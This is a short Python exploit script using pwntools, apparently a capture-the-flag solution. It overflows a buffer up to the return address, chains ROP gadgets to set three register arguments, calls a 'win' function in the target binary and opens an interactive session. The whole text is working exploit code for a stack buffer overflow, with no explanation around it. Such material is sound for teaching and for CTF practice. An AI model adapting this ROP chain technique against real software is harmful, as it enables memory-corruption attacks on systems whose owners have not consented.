#log.info(f"Found helper gadget 'pop_rdi_ret' function at: {hex(pop_rdi_ret_addr)}")


a = 0x1111111111111111
b = 0x2222222222222222
c = 0x3333333333333333

r = conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(elf.sym.ret_gadget),
    p64(elf.sym.pop_rdi_ret), p64(a),
    p64(elf.sym.pop_rsi_ret), p64(b),
    p64(elf.sym.pop_rdx_ret), p64(c),
    p64(elf.sym.win),
)

r.recvuntil(b'Input:')
r.send(payload)
r.interactive()
